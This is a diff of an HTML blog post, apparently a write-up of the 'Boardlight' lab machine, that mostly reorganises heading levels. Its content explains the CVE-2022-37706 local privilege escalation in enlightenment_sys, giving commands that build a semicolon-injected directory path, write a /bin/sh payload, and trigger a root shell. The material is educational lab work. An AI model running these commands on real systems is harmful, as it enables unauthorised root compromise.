@@ -269,7 +269,8 @@
                     <a href="#exploit-cve-2022-37706" aria-label="Exploit CVE-2022-37706">Exploit CVE-2022-37706</a></li></ul>
                 </li>
                 <li>
-                    <a href="#root-flag-" aria-label="Root Flag 🚩">Root Flag 🚩</a></li>
+                    <a href="#root-flag-" aria-label="Root Flag 🚩">Root Flag 🚩</a></li></ul>
+                </li>
                 <li>
                     <a href="#how-does-cve-2022-37706-works" aria-label="How does CVE-2022-37706 works?">How does CVE-2022-37706 works?</a><ul>
                         
@@ -281,16 +282,13 @@
                     <a href="#step-2-write-into-file-and-permission-assignment" aria-label="Step 2: Write into file and Permission assignment">Step 2: Write into file and Permission assignment</a></li>
                 <li>
                     <a href="#step-3-trigger-the-exploit" aria-label="Step 3: Trigger the exploit">Step 3: Trigger the exploit</a></li></ul>
-                </li></ul>
                 </li>
                 <li>
-                    <a href="#conclusion" aria-label="Conclusion">Conclusion</a><ul>
-                        
+                    <a href="#conclusion" aria-label="Conclusion">Conclusion</a></li>
                 <li>
                     <a href="#key-takeaways" aria-label="Key Takeaways">Key Takeaways</a></li>
                 <li>
-                    <a href="#references" aria-label="References">References</a></li></ul>
-                </li>
+                    <a href="#references" aria-label="References">References</a></li>
                 <li>
                     <a href="#connect-with-me" aria-label="Connect with Me">Connect with Me</a>
                 </li>
@@ -729,8 +727,8 @@ root
 root.txt
 </code></pre><pre tabindex="0"><code># cat root.txt
 ###############################
-</code></pre><h3 id="how-does-cve-2022-37706-works">How does CVE-2022-37706 works?<a hidden class="anchor" aria-hidden="true" href="#how-does-cve-2022-37706-works">#</a></h3>
-<h4 id="find-the-suid-binaries-on-the-system-files-that-run-with-root">Find the SUID binaries on the system files that run with root<a hidden class="anchor" aria-hidden="true" href="#find-the-suid-binaries-on-the-system-files-that-run-with-root">#</a></h4>
+</code></pre><h2 id="how-does-cve-2022-37706-works">How does CVE-2022-37706 works?<a hidden class="anchor" aria-hidden="true" href="#how-does-cve-2022-37706-works">#</a></h2>
+<h3 id="find-the-suid-binaries-on-the-system-files-that-run-with-root">Find the SUID binaries on the system files that run with root<a hidden class="anchor" aria-hidden="true" href="#find-the-suid-binaries-on-the-system-files-that-run-with-root">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -perm -4000 2&gt;/dev/null
 </span></span></code></pre></div><ul>
 <li><code>find /</code>: Search recursively starting from the root <code>/</code> directory.</li>
@@ -750,7 +748,7 @@ root.txt
 <li>This binary is <strong>setuid root</strong>, which means it always runs with root privileges.</li>
 <li>It&rsquo;s supposed to wrap commands like <code>mount safely</code>, but it uses <strong><code>system()</code></strong> and fails to sanitize input properly.</li>
 </ul>
-<h4 id="step-1-setup-required-directory"><strong>Step 1:</strong> Setup Required Directory<a hidden class="anchor" aria-hidden="true" href="#step-1-setup-required-directory">#</a></h4>
+<h3 id="step-1-setup-required-directory"><strong>Step 1:</strong> Setup Required Directory<a hidden class="anchor" aria-hidden="true" href="#step-1-setup-required-directory">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir -p /tmp/net
 </span></span><span class="line"><span class="cl">mkdir -p <span class="s2">&#34;/dev/../tmp/;/tmp/exploit&#34;</span>
 </span></span></code></pre></div><ul>
@@ -762,14 +760,14 @@ root.txt
 </ul>
 </li>
 </ul>
-<h4 id="step-2-write-into-file-and-permission-assignment"><strong>Step 2:</strong> Write into file and Permission assignment<a hidden class="anchor" aria-hidden="true" href="#step-2-write-into-file-and-permission-assignment">#</a></h4>
+<h3 id="step-2-write-into-file-and-permission-assignment"><strong>Step 2:</strong> Write into file and Permission assignment<a hidden class="anchor" aria-hidden="true" href="#step-2-write-into-file-and-permission-assignment">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;/bin/sh&#34;</span> &gt; /tmp/exploit
 </span></span><span class="line"><span class="cl">chmod a+x /tmp/exploit
 </span></span></code></pre></div><ul>
 <li>This creates a file <code>/tmp/exploit</code> that, when executed, opens a shell.</li>
 <li>With <code>chmod a+x</code>, it&rsquo;s made executable.</li>
 </ul>
-<h4 id="step-3-trigger-the-exploit"><strong>Step 3:</strong> Trigger the exploit<a hidden class="anchor" aria-hidden="true" href="#step-3-trigger-the-exploit">#</a></h4>
+<h3 id="step-3-trigger-the-exploit"><strong>Step 3:</strong> Trigger the exploit<a hidden class="anchor" aria-hidden="true" href="#step-3-trigger-the-exploit">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys <span class="se">\
 </span></span></span><span class="line"><span class="cl"><span class="se"></span> /bin/mount <span class="se">\
 </span></span></span><span class="line"><span class="cl"><span class="se"></span>  -o noexec,nosuid,utf8,nodev,iocharset<span class="o">=</span>utf8,utf8<span class="o">=</span>0,utf8<span class="o">=</span>1,uid<span class="o">=</span><span class="k">$(</span>id -u<span class="k">)</span>, <span class="se">\
@@ -788,12 +786,12 @@ root.txt
 </span></span></code></pre></div><p>The part after the semicolon (<code>/tmp/exploit</code>) is executed <strong>as root</strong>, opening a <strong>root shell</strong>.</p>
 <h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
 <p>Boardlight is a great hands-on example of how small oversights in system-level binaries can lead to complete system compromise. From a fairly simple web foothold to a local privilege escalation via a public CVE, the machine teaches the value of enumeration and understanding the behaviour of SUID programs. It reinforces that post-exploitation knowledge is just as crucial as initial access.</p>
-<h3 id="key-takeaways">Key Takeaways<a hidden class="anchor" aria-hidden="true" href="#key-takeaways">#</a></h3>
+<h2 id="key-takeaways">Key Takeaways<a hidden class="anchor" aria-hidden="true" href="#key-takeaways">#</a></h2>
 <ul>
 <li>Checking for SUID binaries can quickly reveal potential privilege escalation vectors.</li>
 <li><strong>CVE-2022-37706</strong> is a prime example of how input sanitisation failures in root-level binaries can lead to full system compromise.</li>
 </ul>
-<h3 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h3>
+<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
 <ul>
 <li><a href="https://www.wiz.io/vulnerability-database/cve/cve-2023-30253">https://www.wiz.io/vulnerability-database/cve/cve-2023-30253</a></li>
 <li><a href="https://security.snyk.io/vuln/SNYK-PHP-DOLIBARRDOLIBARR-5660595">https://security.snyk.io/vuln/SNYK-PHP-DOLIBARRDOLIBARR-5660595</a></li>
